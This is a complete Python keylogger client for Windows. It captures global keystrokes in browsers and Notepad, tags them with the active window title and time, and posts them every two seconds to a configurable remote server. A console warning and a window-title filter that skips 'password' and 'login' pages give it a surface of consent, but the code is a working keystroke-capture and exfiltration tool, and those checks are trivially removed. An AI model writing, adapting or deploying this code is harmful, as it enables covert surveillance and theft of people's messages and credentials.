# client.py
import time
import datetime
import threading
import requests
from pynput import keyboard
import win32gui

# CONFIG
SERVER_URL = "http://127.0.0.1:5000/"   # replace with server address (http or https)
AUTH_TOKEN = "123456789"  # must match server AUTH_TOKEN
ALLOWED_APPS = ["notepad", "chrome", "firefox", "edge", "brave"]  # substrings of window titles/process names
IGNORE_IF_TITLE_CONTAINS = ["password", "sign in", "login"]  # quick filter
SEND_INTERVAL = 2.0  # seconds: how often to send buffered typed text

# State
buffer_lock = threading.Lock()
buffer_text = ""    # text buffer to send
current_window = None
last_sent = 0.0

def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd) or ""
    except:
        return ""

def should_record_window(title):
    title_l = title.lower()
    if any(p in title_l for p in IGNORE_IF_TITLE_CONTAINS):
        return False
    return any(app in title_l for app in ALLOWED_APPS)

def on_press(key):
    global buffer_text, current_window  # <---- add this
    try:
        title = get_active_window_title()
        if not should_record_window(title):
            return

        if title != current_window:
            current_window = title
            with buffer_lock:
                buffer_text += f"\n--- Switched to: {current_window} at {time.time()} ---\n"

        if hasattr(key, 'char') and key.char is not None:
            ch = key.char
        else:
            if key == keyboard.Key.space:
                ch = " "
            elif key == keyboard.Key.enter:
                ch = "\n"
            elif key == keyboard.Key.backspace:
                with buffer_lock:
                    buffer_text = buffer_text[:-1]
                return
            else:
                ch = f" [{str(key)}] "

        with buffer_lock:
            buffer_text += ch

    except Exception as e:
        print("Key handler error:", e)


def sender_loop():
    global buffer_text, current_window  # <---- add this
    headers = {"X-AUTH-TOKEN": AUTH_TOKEN, "Content-Type": "application/json"}
    while True:
        time.sleep(SEND_INTERVAL)
        with buffer_lock:
            if not buffer_text.strip():
                continue
            payload_text = buffer_text
            buffer_text = ""
        payload = {
            "timestamp": time.time(),
            "window": current_window or "Unknown",
            "text": payload_text
        }
        try:
            r = requests.post(SERVER_URL, json=payload, headers=headers, timeout=5)
            if r.status_code in (200, 201):
                pass
            else:
                print("Server returned", r.status_code, r.text)
        except Exception as e:
            print("Failed to send:", e)
            with buffer_lock:
                buffer_text = payload_text + buffer_text

if __name__ == "__main__":
    # Quick instruction to keep window visible
    print(" This window must remain open and visible.")
    print("Do NOT type passwords while this is running. Press Ctrl+C to exit.")

    sender = threading.Thread(target=sender_loop, daemon=True)
    sender.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
